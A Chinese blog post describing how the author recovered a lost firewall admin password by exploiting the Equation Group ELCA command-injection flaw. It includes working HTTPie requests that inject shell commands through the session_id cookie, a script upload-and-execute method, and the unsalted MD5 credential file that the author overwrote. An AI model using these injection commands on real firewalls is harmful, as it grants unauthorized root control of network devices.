---
title: 防火墙密码恢复手记
date: 2016-10-20 17:29:18
categories: [逆向分析]
tags: [安全, 防火墙, 密码恢复, 天融信, 逆向分析, 漏洞]
---

公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认仅开通https web管理界面，未开启telnet、ssh等其他管理通道。

联系厂家寻求技术支持，被告知必须返厂更换芯片，费用大约在2000元左右（网上搜了一下，几乎所有密码遗失的客户最终都只能选择返厂）。公司用于该网络联网的仅此一台防火墙设备，终端数量在500以上，无其他硬件备份方案。因用户众多，管理要求细致，防火墙配置非常复杂，保存的配置文件也不是最新的。若返厂维修的话，则无法找到完备的替代方案。

于是决定先自己想办法，开启密码恢复之旅。Go！


### 猜测密码，自动验证

首先想到的是根据可能的密码规则和常用组合，构造一个密码字典，通过编写简单的Python脚本进行登录验证。万一不行的话，就穷举来尝试暴力破解。

可是开始跑脚本的时候发现想法实在太天真了，存在两个致命的问题：

1.	防火墙白天负荷过重，Web响应非常慢。有时候一个请求可能在半分钟以上。
2.	Web管理平台有登录次数限制，大约6次密码错误以后，就会锁定账号一段时间。

在尝试了几十个最可能出现的密码组合后，彻底放弃了这条捷径。

看来偷懒是不成了，必须得动真格的。


### 搜寻漏洞，获取控制权

nmap扫描发现防火墙只开通了https端口。不是专业的安全研究人员，只能在网上搜索该款防火墙的漏洞资料，不(suo)幸的是，还真发现了不少。

找到的第一篇文章提到了Heartbleed漏洞，却未对漏洞利用方式做过多解释。需要更多学习资料，根据这个方向继续搜索，又找到了一些文章。其中，NSA Equation Group那篇文章信息量最高，对漏洞的特征和产生的原因分析的非常透彻，利用方式也做了简要说明。由于该设备尚未按厂家要求进行“方程式”漏洞修复升级，按照文章的提示，用Brup进行Eligible Candidate漏洞测试（打算用Postman，但因chrome的https证书问题放弃），漏洞果然还在！

怀着激动的心情，尝试了 `ls -la />/www/htdocs/1`、 `find / -type f>/www/htdocs/1` 等指令，对防火墙文件系统的目录结构进行初步了解，也看到了配置文件存放的位置。执行 `cp /XXX/conf/config>/www/htdocs/1`，把配置文件down下来一看，果然是新鲜的味道。

启动telnetd服务并尝试连接，报错，估计是没有加特定启动参数的缘故，没做深入研究。看来暂时还是只能通过https漏洞方式跑命令了。

随着执行命令次数越来越多，Brup构造请求的方式效率太低，于是写了简单的Python函数在IPython下面跑，终觉得灵活性不够。最后决定采用HTTPie命令行的方式发送https请求（curl没有httpie方便），后续所有命令都通过这种方式交互。

```shell
$ http --verify=no https://x.x.x.x/cgi/maincgi.cgi 'Cookie: session_id=x`ls -la /tmp>/www/htdocs/1`'
```


### 文件上传，执行脚本文件

之前都是一次请求执行一条命令，效率太低，也存在诸多限制。最好的方式是上传一个sh脚本在防火墙上执行，这就需要以某种方式传送文件到防火墙上去。

另一方面，根据漏洞名称和Equation Group搜索到这篇文章：[Equation Group泄露文件分析][6]，才注意到这是国际顶尖黑客组织，也是NSA合作的方程式黑客组织（Equation Group），被另一个名为“The ShadowBrokers”的黑客组织攻下了，珍藏的系列高级工具被打包分享。这可是个好东西！赶紧下载解密，找到ELCA的漏洞利用代码，运行后却发现没有如逾期般的启动nopen远程管理软件，原因未知，颇有些失望。不过在py源码中看到了文件上传的方式，其实就是利用了cgi文件上传处理方式，它每次会在/tmp目录下生成一个cgi\*的临时文件。ELCA利用代码的流程是连续执行多次指令，第一次 `rm /tmp/cgi*`清理tmp目录，接着post上传文件同时复制保存一份 `cp /t*/cg* /tmp/.a`，再加执行权限 `chmod +x /tmp/.a`，最后执行 `/tmp/.a`。

![upload_run.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/upload_run.png)

当然，代码并没有直接上传一个可执行文件，而是巧妙（恕见识少，我知道*nix下经常这样干）的将需要的多个文件用tar打包后，附到sh脚本的最后。在sh脚本中用dd命令将tar包copy出来再解压运行。下面是工具中stage.sh的部分代码：

![stager.jpg](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/stager.png)

文件tar打包的Python代码片段：


![build_exploit_payload.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/build_exploit_payload.png)

就我的需求而言，只是上传脚本执行，就不用做得那么复杂了。简单的post我的sh脚本，同时执行 `sh /tmp/cgi*`。前提是我的sh脚本中都做了清理工作 `rm /tmp/cgi*`。

```shell
http --verify=no -b -f POST https://x.x.x.x/cgi/maincgi.cgi 'Cookie: session_id=x`sh /t*/cg*`' a@test.sh; http --verify=no https://x.x.x.x/1
```

HTTPie可以用 `uploadfilename@localfilename` 的方式很方便的实现文件上传。之所以两条指令在一行是为了方便查看前一个脚本的输出。

```sh
#!/bin/sh
# 清除/tmp/cgi*，防止干扰下次运行
rm -f /t*/cgi*

echo =============================== >/www/htdocs/1
date >>/www/htdocs/1

echo "***************" >>/www/htdocs/1
cd /tmp
ps >>/www/htdocs/1
netstat -nltp >>/www/htdocs/1
ls -la /xxx/etc /data/auth/db /tmp >>/www/htdocs/1
```

上面的示例脚本就可以一次进行多种操作，获取进程信息、网络连接情况、目录文件等多种信息，大幅减少交互次数提高效率。


### 逆向分析，寻找密码

做了很多准备工作，找到了比较便捷的脚本执行方式。而且根据ps结果来看，指令是以root权限运行的。接下来要开始干正事了，`tar cf /home/htdocs/1 /` 打包文件系统，down下来准备逆向分析。因为web登录入口指向maincgi.cgi，就从它开始。

逆向分析的过程相当繁杂、漫长、枯燥乏味，具有相当的挑战性，所以需要坚定的毅力和不时涌现的灵感。无数次调整思路和方向，无数次寻找新的突破口。

我现在也记不清当初分析时的前因后果，就把一些分析的结果整理下，做一个简单的分享。



#### 入口 maincgi.cgi

`maincgi.cgi` 位于 `/www/cgi/` 目录下。用IDA进行逆向分析。

根据登录form提交的 `username` 和 `passwd` 在string窗口搜索，x跟踪调用情况分析，最终来到 000403D4 函数内。


![maincgi_403D4.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/maincgi_403D4.png)

下面是更容易理解的C伪代码（我开始分析的时候没找到可用的hexrays，这是事后撰写此文时找到的。:-(  工欲善其事必先利其器啊！）：

![maincgi_403D4_c.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/maincgi_403D4_c_m.png)

可以看到，username和passwd参数都原封不动的传入到login函数，想必沿着这个方向一定能找到密码保存的地方。

跟进发现login是import函数，不在maincgi.cgi中实现。为了方便，我把lib和so目录下所有文件的符号表都进行了分析，结果保存在一个文件中备查。

```shell
$ nm -D xxx/lib/* xxx/so/* > symbols.txt
```

很快发现 `login` 函数在 /xxx/so/libwebui_tools.so 中实现。


#### 入了RPC的坑

本以为找到 libwebui_tools.so 中的login实现，一切皆可水落石出。谁料还是 *too young, too naive*。

根据export表很快定位到login函数的实现，开始是TLS连接127.0.0.1：4000，接着是一堆错误处理代码。

![login.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_m.png)

![login_4000.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_4000_m.png)

其中有一个 `gui_send_reqx` 函数的调用参数 `CFG_AUTH` 引起了我的注意，猜测是一种自定义的类RPC实现。

![login_cfg_auth.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_cfg_auth.png)

唉，还是C伪代码看得清楚啊！再次哭晕在厕所 :-(

![login_c.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_c_m.png)

既然不是通过本地.so调用，那只有知道到底是谁提供了这个rpc服务，才能找到接下来的路。

#### 好用的netstat

好在我们有执行代码的权限，好在防火墙里面有netstat命令。执行 `netstat -nltp >>/www/htdocs/1` 得到下面的结果：

![netstat.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/netstat_m.png)

一目了然。原来服务是 `xxx_configd` 提供的呀！被ELCA漏洞利用脚本误导了，以为是只是一个命令行shell，之前跟过，但没有细看。这不，还是要回头找它。



#### 百转千回

xxx_configd 分析过程并非一帆风顺。

根据RPC传递的参数CFG_AUTH作为线索进行追踪，看到RPC支持多个命令。当命令为CFG_AUTH时，将数字5写到参数传入的内存区域某个变量中。没有其他更多的信息，看来只能根据caller向上一步步追了。

![xxx_configd_cfg_auth.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/tos_configd_cfg_auth.png)

代码回到rpc的消息处理thread中，经过逐步分析，定位到消息处理函数中。

![xxx_configd_rpchandle.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/tos_configd_rpchandle.png)

跟进去，可以看到大致的处理流程。有一个switch过程，case 5后面就是CFG_AUTH的处理代码。5就是前面第一个过程中设置的变量。xxx_manager_auth函数用于接管用户密码鉴权工作，它是一个import函数，按照前面的方法查到它在 /xxx/so/libmanager.so 中实现。

![xxx_configd_rpchandlelogin.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/xxx_configd_rpchandlelogin_m.png)


#### 胜利的曙光

libmanager的export表非常简练，似乎每一个都让人颇感兴趣。

![libmanager_export.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_export_m.png)

先看看我们的目标函数xxx_manager_auth：

![libmanager_auth.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_auth_m.png)


信息量很大，到这里基本上就看到了胜利的曙光。

首先看到的是用户名+密码的MD5，然后传入到 j_match_manager_name 函数中进行校验。这不就是经典的用户名密码校验过程嘛（未加salt）。

需要说明一下的是，上图中看到的username参数名称是我综合各类分析得知内容后改名的，并不是想当然，更不是IDA智能更名。username+32是密码明文，这也是在前面的分析过程中得出的结论。

跟进match_manager_name函数，并没有立即发现直观的密码文件读取过程。取而代之的是，内存中存在最多500个struct，其中包含了用户名和MD5值，鉴权过程就是与其一一进行匹配比对。Local_db_dev_node是一个全局buffer，搞清楚它的数据来源就找到根源了。

![libmanager_match_manager_name.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_match_manager_name.png)

按X查看Local_db_dev_node的reference，还真不少。

![libmanager_xref.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_xref_m.png)

第一个read_dev_manager_file就很像，跟进去看一下。

![libmanager_read_dev_manager_file.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_read_dev_manager_file_m.png)

Bingo！就是它了！ `/xxx/etc/xxx_dev_manager_info` 其实这个文件之前也注意到，不过没曾想它居然保存了鉴权信息，而且是用户名密码拼接MD5这么简单！

用hexdump查看之前下载的xxx_dev_manager_info进行验证，大小104字节，与分析得到的struct大小完全一致。再看用户名和密码的位置，和分析Local_db_dev_node结构完全一致。



#### 清除最后的障碍

终于找到密码保存到文件了，三下五除二，自己设定一个密码，计算MD5值，修改xxx_dev_manager_info对应的区域。文件上传，覆盖，重启，等结果……

```python
import hashlib
print(hashlib.md5('********' + '111111').hexdigest())
```

几分钟后，设备起来了，赶紧试一下密码，错误！！！

郁闷，怎么会呢？down下/xxx/etc/xxx_dev_manager_info一看，还是老数据。看来是工作还没到位。

想起 libmanager 不是有那么多可疑的函数吗？挑感兴趣的进去看看，比如write_memdata2flash：

![libmanager_write_memdata2flash.png](http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_write_memdata2flash_m.png)

对，就它了。一般网络设备修改配置以后，不都还来一个 `wr mem` 吗？估计 /data/auth/db/ 才是最终保存数据的地方，/xxx/etc可能重启的时候会重新copy覆盖。

再重新上传一次修改好的xxx_dev_manager_info文件，只不过这次同时覆盖了几个目录下的文件。重启，用设定的密码登录，搞定！！！

#### 走过的弯路

当然，我分析过的文件远不止上面这些，也不是按照本文的思路一步一步走下来，走了不少弯路。凭感觉，或为了寻找新线索，或漫无目的地毯式搜索。除了上面列举的部分之外，还分析过其他几个.so文件，跟踪过上百个函数，多数与我需要的东西关系并不太大。

逆向分析就是这样，不可能一帆风顺，也没有既定的方法和思路。就是要有一种执着的精神，在不断的尝试、纠错和总结过程中达到目的地。成功后那一刻豁然开朗的成就感一直是我所痴迷的。


### 关于MD5破解不得不说的事

既然知道了算法，也有了MD5数据，是不是可以真正的找回当初的密码呢？

和第一步猜测密码类似，用python按照一定规则，生成可能的密码序列。调用 `hashlib.md5()` 计算hash值与目标进行比对，结果跑了一天没结果。

想着这种计算密集型的程序，在python和c之间切换太频繁可能影响效率。又在网上找到一个 [Fast MD5 hash implementation in x86 assembly][7] 汇编实现的快速算法，并且根据实际需求做了一定的优化。运行，依然无结果。

不甘心，再到网上搜索资料，发现人家都用GPU跑字典。好吧，我也找来一个 [Hashcat][8]，在 i5 8G内存 的iMac 上试跑，的确速度非常快。然而，由于密码长，计算量过大，最终也没跑出结果，就此作罢。

现在想想，如果没有密码长度、规则等任何信息的话，光凭暴力破解一个非典型密码，几乎是 Mission Impossible。


### 搞定，收工

很久没写过长文，也没发过技术类文章。上一次可能要追溯到2001年8月的时候，曾以打鸡血似的饱满激情写过一篇[软件逆向习作][9]。

此次防火墙密码成功恢复，其漏洞功不可没。对我而言，又重温了一把当初年少时对技术的执着。

最后，小结一下：

- 软件逆向分析是个体力活。
- 工欲善其事必先利其器。
- 安全问题无时无刻不在。



[1]: http://www.2cto.com/Article/201410/345138.html
[2]: http://www.tuicool.com/articles/Brm2Ebi
[3]: http://finance.ifeng.com/a/20140929/13156376_0.shtml
[4]: https://www.secpulse.com/archives/23760.html
[5]: http://www.topsec.com.cn/aqtb/aqtb1/jjtg/160820.htm
[6]: http://www.freebuf.com/special/112272.html
[7]: https://www.nayuki.io/page/fast-md5-hash-implementation-in-x86-assembly
[8]: http://hashcat.net/hashcat/
[9]: http://www.pediy.com/kssd/tutorial/chap6-1-41.htm
